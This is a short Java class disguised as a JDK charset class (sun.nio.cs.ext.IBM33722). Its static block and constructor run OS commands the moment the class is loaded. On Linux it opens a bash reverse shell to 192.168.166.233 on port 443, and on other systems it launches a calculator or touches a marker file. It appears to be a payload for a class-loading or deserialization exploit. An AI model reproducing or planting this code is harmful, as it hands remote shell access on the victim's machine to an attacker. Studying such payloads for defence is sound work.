package sun.nio.cs.ext;

import java.io.File;
import java.util.HashMap;
import java.util.UUID;

public class IBM33722 {
    public IBM33722() {
        fun();
    }

    private static HashMap<String, String> fun() {
        String var1 = UUID.randomUUID().toString().replace("-", "").substring(1, 9);
        String var2 = System.getProperty("os.name");
        String[] var0;
        if (var2.startsWith("Mac OS")) {
            var0 = new String[]{"/bin/bash", "-c", "open -a Calculator"};
        } else if (var2.startsWith("Windows")) {
            var0 = new String[]{"cmd.exe", "/c", "calc"};
        } else if ((new File("/bin/bash")).exists()) {
//            var0 = new String[]{"/bin/bash", "-c", "touch /tmp/charsets_test_" + var1 + ".log"};
            var0 = new String[]{"/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.166.233/443 0>&1"};
        } else {
            var0 = new String[]{"/bin/sh", "-c", "touch /tmp/charsets_test_" + var1 + ".log"};
        }

        try {
            Runtime.getRuntime().exec(var0);
        } catch (Throwable var4) {
            var4.printStackTrace();
        }

        return null;
    }

    static {
        fun();
    }
}
